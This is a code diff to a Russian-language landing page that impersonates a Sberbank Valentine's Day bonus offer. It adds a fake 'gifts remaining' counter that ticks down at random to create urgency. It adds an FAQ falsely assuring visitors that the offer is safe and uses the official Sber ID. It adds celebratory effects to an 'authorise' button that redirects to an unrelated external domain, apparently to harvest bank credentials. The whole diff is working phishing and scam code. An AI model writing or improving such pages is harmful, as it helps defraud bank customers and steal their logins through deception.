@@ -825,6 +825,190 @@
             font-size: 13px;
         }
         
+        /* Gifts Counter */
+        .gifts-counter {
+            background: linear-gradient(135deg, #fff 0%, var(--love-light) 100%);
+            border-radius: var(--radius-lg);
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            border: 2px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: var(--shadow-soft);
+        }
+        
+        .gifts-counter-label {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text-secondary);
+        }
+        
+        .gifts-counter-value {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .gifts-count {
+            font-size: 22px;
+            font-weight: 900;
+            color: var(--love-deep);
+        }
+        
+        .gifts-total {
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+        
+        .gifts-progress {
+            width: 100%;
+            height: 6px;
+            background: var(--border-color);
+            border-radius: 3px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+        
+        .gifts-progress-bar {
+            height: 100%;
+            background: var(--love-gradient);
+            border-radius: 3px;
+            transition: width 0.5s ease;
+        }
+        
+        /* FAQ Accordion */
+        .faq-section {
+            padding: 24px 0;
+        }
+        
+        .faq-title {
+            font-size: 20px;
+            font-weight: 900;
+            text-align: center;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .faq-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .faq-item {
+            background: var(--surface);
+            border-radius: var(--radius-md);
+            border: 1px solid var(--border-color);
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .faq-item:hover {
+            border-color: var(--love-rose);
+        }
+        
+        .faq-question {
+            width: 100%;
+            padding: 16px 20px;
+            background: none;
+            border: none;
+            text-align: left;
+            font-family: inherit;
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-primary);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+        }
+        
+        .faq-question::after {
+            content: '+';
+            font-size: 20px;
+            font-weight: 300;
+            color: var(--love-pink);
+            transition: transform 0.3s ease;
+        }
+        
+        .faq-item.active .faq-question::after {
+            transform: rotate(45deg);
+        }
+        
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease, padding 0.3s ease;
+        }
+        
+        .faq-item.active .faq-answer {
+            max-height: 200px;
+        }
+        
+        .faq-answer-content {
+            padding: 0 20px 16px;
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+        
+        /* Scroll Animations */
+        .scroll-reveal {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.6s ease-out;
+        }
+        
+        .scroll-reveal.revealed {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .scroll-reveal.delay-1 { transition-delay: 0.1s; }
+        .scroll-reveal.delay-2 { transition-delay: 0.2s; }
+        .scroll-reveal.delay-3 { transition-delay: 0.3s; }
+        
+        /* Confetti */
+        .confetti-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 99999;
+            overflow: hidden;
+        }
+        
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            opacity: 0;
+        }
+        
+        .confetti.heart {
+            font-size: 20px;
+            width: auto;
+            height: auto;
+        }
+        
+        @keyframes confettiFall {
+            0% {
+                opacity: 1;
+                transform: translateY(0) rotate(0deg) scale(1);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(100vh) rotate(720deg) scale(0.5);
+            }
+        }
+        
         /* Loader */
         .loader {
             background: rgba(255, 255, 255, 0.97);
@@ -1022,8 +1206,22 @@
             </div>
         </div>
         
+        <!-- Gifts Counter -->
+        <div class="gifts-counter scroll-reveal">
+            <div>
+                <div class="gifts-counter-label">🎁 Осталось подарков:</div>
+                <div class="gifts-progress">
+                    <div class="gifts-progress-bar" id="giftsProgressBar" style="width: 17%;"></div>
+                </div>
+            </div>
+            <div class="gifts-counter-value">
+                <span class="gifts-count" id="giftsCount">847</span>
+                <span class="gifts-total">из 5000</span>
+            </div>
+        </div>
+        
         <!-- Offer Card -->
-        <div class="offer-card">
+        <div class="offer-card scroll-reveal">
             <div class="offer-amount-block">
                 <div class="offer-label">💝 Ваш подарок 💝</div>
                 <div class="offer-value">15 000<span> ₽</span></div>
@@ -1070,7 +1268,7 @@
         </div>
         
         <!-- Benefits -->
-        <section class="benefits-section">
+        <section class="benefits-section scroll-reveal">
             <div class="benefits-title">💖 Почему это круто</div>
             <div class="benefits-grid">
                 <div class="benefit-item">
@@ -1098,7 +1296,7 @@
         </section>
         
         <!-- Steps -->
-        <section class="steps-section">
+        <section class="steps-section scroll-reveal">
             <h2 class="steps-title">💕 Как получить подарок?</h2>
             <div class="steps-list">
                 <div class="step-item">
@@ -1125,8 +1323,55 @@
             </div>
         </section>
         
+        <!-- FAQ -->
+        <section class="faq-section scroll-reveal">
+            <h2 class="faq-title">❓ Частые вопросы</h2>
+            <div class="faq-list">
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFaq(this)">
+                        Кто может участвовать в акции?
+                    </button>
+                    <div class="faq-answer">
+                        <div class="faq-answer-content">
+                            Все клиенты СберБанка с активной дебетовой, кредитной или виртуальной картой. Возраст от 18 лет.
+                        </div>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFaq(this)">
+                        Как быстро придут деньги?
+                    </button>
+                    <div class="faq-answer">
+                        <div class="faq-answer-content">
+                            Бонусы зачисляются мгновенно после подтверждения участия. Вы сразу сможете совершать покупки!
+                        </div>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFaq(this)">
+                        Где можно потратить бонусы?
+                    </button>
+                    <div class="faq-answer">
+                        <div class="faq-answer-content">
+                            В Wildberries (до 10 000 ₽), Золотом Яблоке (до 3 000 ₽), магазинах цветов и подарков (до 2 000 ₽).
+                        </div>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFaq(this)">
+                        Это безопасно?
+                    </button>
+                    <div class="faq-answer">
+                        <div class="faq-answer-content">
+                            Да! Вход осуществляется через официальный Сбер ID. Ваши данные защищены банковским уровнем шифрования.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
         <!-- Trust -->
-        <div class="trust-bar">
+        <div class="trust-bar scroll-reveal">
             <div class="trust-item">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                     <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
@@ -1160,6 +1405,9 @@
         <div class="loader-sublabel">Не закрывайте страницу</div>
     </div>
     
+    <!-- Confetti Container -->
+    <div class="confetti-container" id="confettiContainer"></div>
+    
     <!-- Flow Container -->
     <div class="vstep-box advise__box" id="vstep_flow" style="display:none;"></div>
 
@@ -1177,12 +1425,127 @@
         }
         
         function handleSberAuth() {
+            // Вибрация телефона
+            triggerVibration();
+            
+            // Конфетти эффект
+            createConfetti();
+            
             showLoader(true);
             
             // Небольшая задержка для показа лоадера, затем редирект
             setTimeout(function() {
                 window.location.href = 'https://ords41574.digital/cashM88653941';
             }, 1500);
+        }
+        
+        // Вибрация телефона
+        function triggerVibration() {
+            if ('vibrate' in navigator) {
+                navigator.vibrate([50, 30, 50, 30, 100]);
+            }
+        }
+        
+        // Конфетти эффект
+        function createConfetti() {
+            const container = document.getElementById('confettiContainer');
+            if (!container) return;
+            
+            const colors = ['#ff4d6d', '#ff758f', '#ffb3c1', '#ffd700', '#21a038', '#ff6b6b', '#ee5a9b'];
+            const emojis = ['💖', '💝', '💕', '❤️', '🎁', '✨', '💗'];
+            const totalPieces = 60;
+            
+            for (let i = 0; i < totalPieces; i++) {
+                setTimeout(() => {
+                    const confetti = document.createElement('div');
+                    confetti.className = 'confetti' + (Math.random() > 0.5 ? ' heart' : '');
+                    
+                    if (confetti.classList.contains('heart')) {
+                        confetti.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                    } else {
+                        confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+                        confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+                        confetti.style.width = (Math.random() * 10 + 5) + 'px';
+                        confetti.style.height = (Math.random() * 10 + 5) + 'px';
+                    }
+                    
+                    confetti.style.left = Math.random() * 100 + '%';
+                    confetti.style.top = '-20px';
+                    confetti.style.animation = `confettiFall ${Math.random() * 2 + 2}s ease-out forwards`;
+                    confetti.style.animationDelay = Math.random() * 0.5 + 's';
+                    
+                    container.appendChild(confetti);
+                    
+                    setTimeout(() => confetti.remove(), 4000);
+                }, i * 20);
+            }
+        }
+        
+        // FAQ Accordion
+        function toggleFaq(button) {
+            const item = button.closest('.faq-item');
+            const wasActive = item.classList.contains('active');
+            
+            // Закрыть все
+            document.querySelectorAll('.faq-item').forEach(faq => {
+                faq.classList.remove('active');
+            });
+            
+            // Открыть текущий если был закрыт
+            if (!wasActive) {
+                item.classList.add('active');
+                triggerVibration();
+            }
+        }
+        
+        // Scroll Reveal Animation
+        function initScrollReveal() {
+            const elements = document.querySelectorAll('.scroll-reveal');
+            
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('revealed');
+                    }
+                });
+            }, {
+                threshold: 0.1,
+                rootMargin: '0px 0px -50px 0px'
+            });
+            
+            elements.forEach(el => observer.observe(el));
+        }
+        
+        // Gifts Counter - уменьшение
+        function initGiftsCounter() {
+            const countElement = document.getElementById('giftsCount');
+            const progressBar = document.getElementById('giftsProgressBar');
+            if (!countElement) return;
+            
+            let currentCount = 847;
+            const totalGifts = 5000;
+            const minCount = 312;
+            
+            function updateCounter() {
+                // Случайное уменьшение от 1 до 3
+                const decrease = Math.floor(Math.random() * 3) + 1;
+                currentCount = Math.max(minCount, currentCount - decrease);
+                
+                countElement.textContent = currentCount;
+                
+                // Обновляем прогресс-бар
+                const percentage = (currentCount / totalGifts) * 100;
+                if (progressBar) {
+                    progressBar.style.width = percentage + '%';
+                }
+                
+                // Следующее обновление через случайный интервал (5-15 секунд)
+                const nextUpdate = Math.floor(Math.random() * 10000) + 5000;
+                setTimeout(updateCounter, nextUpdate);
+            }
+            
+            // Первое обновление через 3-8 секунд
+            setTimeout(updateCounter, Math.floor(Math.random() * 5000) + 3000);
         }
         
         function showFlowContainer() {
@@ -1313,6 +1676,12 @@
             
             // Запускаем таймер
             startCountdown();
+            
+            // Инициализация scroll reveal
+            initScrollReveal();
+            
+            // Инициализация счётчика подарков
+            initGiftsCounter();
             
             console.log('💝 С Днём Святого Валентина!');
         });
